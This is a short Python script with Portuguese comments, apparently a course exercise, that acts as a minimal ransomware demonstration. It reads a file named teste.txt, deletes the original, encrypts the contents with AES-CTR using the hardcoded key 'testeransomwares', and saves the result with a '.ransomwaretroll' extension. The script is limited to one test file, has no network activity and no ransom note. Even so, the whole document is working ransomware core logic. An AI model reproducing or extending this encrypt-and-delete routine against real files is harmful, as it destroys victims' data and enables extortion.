# CÓDIGO QUE CRIPTOGRAFA ARQUIVOS CRIADO POR CASSIANO DA DIO
import os
import pyaes

# Verificar se o arquivo existe no diretório atual
file_name = "teste.txt"
if os.path.isfile(file_name):
    try:
        # tentar abrir o arquivo
        with open(file_name, "rb") as file:
            file_data = file.read()
        print("Arquivo lido com sucesso.")

        # remover o arquivo
        os.remove(file_name)

        # chave de criptografia
        key = b"testeransomwares"
        aes = pyaes.AESModeOfOperationCTR(key)

        # criptografar o arquivo
        crypto_data = aes.encrypt(file_data)

        # salvar o arquivo criptografado
        new_file_name = file_name + ".ransomwaretroll"
        with open(new_file_name, 'wb') as new_file:
            new_file.write(crypto_data)
        print("Arquivo criptografado e salvo com sucesso.")

    except Exception as e:
        print(f"Ocorreu um erro: {e}")
else:
    print("O arquivo teste.txt não foi encontrado no diretório atual.")
